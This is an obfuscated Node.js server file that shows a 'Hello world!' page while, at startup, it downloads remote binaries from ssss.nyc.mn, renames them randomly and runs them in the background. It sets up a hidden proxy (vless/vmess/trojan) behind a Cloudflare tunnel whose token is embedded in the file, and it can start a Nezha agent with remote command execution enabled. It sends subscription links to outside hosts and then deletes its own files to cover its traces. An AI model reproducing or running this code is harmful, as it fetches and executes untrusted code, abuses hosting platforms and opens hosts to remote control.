const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require('child_process')['exec']),{execSync}=require('child_process'),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||'./tmp',SUB_PATH=process['env']['SUB_PATH']||'sub',PORT=process['env']['SERVER_PORT']||process['env']['PORT']||0xbb8,UUID=process['env']['UUID']||'yAgDLPiSiiAx8DLL',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'boneconn.de5.net',ARGO_AUTH=process['env']['ARGO_AUTH']||'eyJhIjoiMDdkY2U0OWMxNzE3N2RhZDQ0NmY0MzdiZWY0MThkM2YiLCJ0IjoiYTg2ODNlYWQtY2EwOS00MjE0LWFjOTItNTY4YTQ4ZmExMTU5IiwicyI6Ik5UWTBNVEF4TjJNdFlUUmpOUzAwWVdVNExXSTVaVGN0TW1RM01UZGpNVEZqTWpjeCJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process['env']['CFIP']||'cdns.doon.eu.org',CFPORT=process['env']['CFPORT']||0x1bb,NAME=process['env']['NAME']||'boneconnn';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const w='abcdefghijklmnopqrstuvwxyz';let X='';for(let A=0x0;A<0x6;A++){X+=w['charAt'](Math['floor'](Math['random']()*w['length']));}return X;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let w;try{w=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const X=Buffer['from'](w,'base64')['toString']('utf-8'),A=X['split']('\x0a')['filter'](g=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](g));if(A['length']===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':A}),{'headers':{'Content-Type':'application/json'}})['catch'](g=>{return null;}),null;}catch(g){return null;}}function cleanupOldFiles(){try{const w=fs['readdirSync'](FILE_PATH);w['forEach'](X=>{const A=path['join'](FILE_PATH,X);try{const g=fs['statSync'](A);g['isFile']()&&fs['unlinkSync'](A);}catch(z){}});}catch(X){}}app['get']('/',function(w,X){X['send']('Hello\x20world!');});async function generateConfig(){const w={'log':{'access':'/dev/null','error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,'config.json'),JSON['stringify'](w,null,0x2));}function getSystemArchitecture(){const w=os['arch']();return w==='arm'||w==='arm64'||w==='aarch64'?'arm':'amd';}function downloadFile(w,X,A){const g=w;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const z=fs['createWriteStream'](g);axios({'method':'get','url':X,'responseType':'stream'})['then'](E=>{E['data']['pipe'](z),z['on']('finish',()=>{z['close'](),console['log']('Download\x20'+path['basename'](g)+'\x20successfully'),A(null,g);}),z['on']('error',S=>{fs['unlink'](g,()=>{});const Z='Download\x20'+path['basename'](g)+'\x20failed:\x20'+S['message'];console['error'](Z),A(Z);});})['catch'](E=>{const S='Download\x20'+path['basename'](g)+'\x20failed:\x20'+E['message'];console['error'](S),A(S);});}async function downloadFilesAndRun(){const w=getSystemArchitecture(),X=getFilesForArchitecture(w);if(X['length']===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const A=X['map'](S=>{return new Promise((Z,R)=>{downloadFile(S['fileName'],S['fileUrl'],(M,o)=>{M?R(M):Z(o);});});});try{await Promise['all'](A);}catch(S){console['error']('Error\x20downloading\x20files:',S);return;}function g(Z){const R=0x1fd;Z['forEach'](M=>{fs['existsSync'](M)&&fs['chmod'](M,R,o=>{o?console['error']('Empowerment\x20failed\x20for\x20'+M+':\x20'+o):console['log']('Empowerment\x20success\x20for\x20'+M+':\x20'+R['toString'](0x8));});});}const z=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];g(z);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const Z=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',R=new Set(['443','8443','2096','2087','2083','2053']),M=R['has'](Z)?'true':'false',o='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+M+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path['join'](FILE_PATH,'config.yaml'),o);const d='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(d),console['log'](phpName+'\x20is\x20running'),await new Promise(c=>setTimeout(c,0x3e8));}catch(c){console['error']('php\x20running\x20error:\x20'+c);}}else{let C='';const Y=['443','8443','2096','2087','2083','2053'];Y['includes'](NEZHA_PORT)&&(C='--tls');const B='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+C+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(B),console['log'](npmName+'\x20is\x20running'),await new Promise(t=>setTimeout(t,0x3e8));}catch(t){console['error']('npm\x20running\x20error:\x20'+t);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const E='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(E),console['log'](webName+'\x20is\x20running'),await new Promise(F=>setTimeout(F,0x3e8));}catch(F){console['error']('web\x20running\x20error:\x20'+F);}if(fs['existsSync'](botPath)){let i;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))i='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?i='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':i='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+i+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(D=>setTimeout(D,0x7d0));}catch(D){console['error']('Error\x20executing\x20command:\x20'+D);}}await new Promise(H=>setTimeout(H,0x1388));}function getFilesForArchitecture(w){let X;w==='arm'?X=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:X=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const A=w==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';X['unshift']({'fileName':npmPath,'fileUrl':A});}else{const g=w==='arm'?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';X['unshift']({'fileName':phpPath,'fileUrl':g});}}return X;}function argoType(){if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const w='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),w);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){let w;if(ARGO_AUTH&&ARGO_DOMAIN)w=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',w),await A(w);else try{const g=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),'utf-8'),z=g['split']('\x0a'),E=[];z['forEach'](S=>{const Z=S['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(Z){const R=Z[0x1];E['push'](R);}});if(E['length']>0x0)w=E[0x0],console['log']('ArgoDomain:',w),await A(w);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,'boot.log'));async function S(){try{process['platform']==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(R){}}S(),await new Promise(R=>setTimeout(R,0xbb8));const Z='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+Z+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(R=>setTimeout(R,0xbb8)),await extractDomains();}catch(R){console['error']('Error\x20executing\x20command:\x20'+R);}}}catch(M){console['error']('Error\x20reading\x20boot.log:',M);}async function X(){try{const o=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(o['data']&&o['data']['country_code']&&o['data']['org'])return o['data']['country_code']+'_'+o['data']['org'];}catch(d){try{const c=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(c['data']&&c['data']['status']==='success'&&c['data']['countryCode']&&c['data']['org'])return c['data']['countryCode']+'_'+c['data']['org'];}catch(C){}}return'Unknown';}async function A(o){const d=await X(),c=NAME?NAME+'-'+d:d;return new Promise(C=>{setTimeout(()=>{const Y={'v':'2','ps':''+c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':o,'path':'/vmess-argo?ed=2560','tls':'tls','sni':o,'alpn':'','fp':'firefox'},B='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+o+'&fp=firefox&type=ws&host='+o+'&path=%2Fvless-argo%3Fed%3D2560#'+c+'\x0a\x0avmess://'+Buffer['from'](JSON['stringify'](Y))['toString']('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+o+'&fp=firefox&type=ws&host='+o+'&path=%2Ftrojan-argo%3Fed%3D2560#'+c+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](B)['toString']('base64')),fs['writeFileSync'](subPath,Buffer['from'](B)['toString']('base64')),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(t,F)=>{const i=Buffer['from'](B)['toString']('base64');F['set']('Content-Type','text/plain;\x20charset=utf-8'),F['send'](i);}),C(B);},0x7d0);});}}async function uploadNodes(){if(UPLOAD_URL&&PROJECT_URL){const w=PROJECT_URL+'/'+SUB_PATH,X={'subscription':[w]};try{const A=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',X,{'headers':{'Content-Type':'application/json'}});return A&&A['status']===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),A):null;}catch(g){if(g['response']){if(g['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const z=fs['readFileSync'](listPath,'utf-8'),E=z['split']('\x0a')['filter'](Z=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](Z));if(E['length']===0x0)return;const S=JSON['stringify']({'nodes':E});try{const Z=await axios['post'](UPLOAD_URL+'/api/add-nodes',S,{'headers':{'Content-Type':'application/json'}});return Z&&Z['status']===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),Z):null;}catch(R){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const w=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)w['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&w['push'](phpPath);process['platform']==='win32'?exec('del\x20/f\x20/q\x20'+w['join']('\x20')+'\x20>\x20nul\x202>&1',X=>{console['clear'](),console['log']('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+w['join']('\x20')+'\x20>/dev/null\x202>&1',X=>{console['clear'](),console['log']('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const w=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),w;}catch(X){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+X['message']),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(w){console['error']('Error\x20in\x20startserver:',w);}}startserver()['catch'](w=>{console['error']('Unhandled\x20error\x20in\x20startserver:',w);}),app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
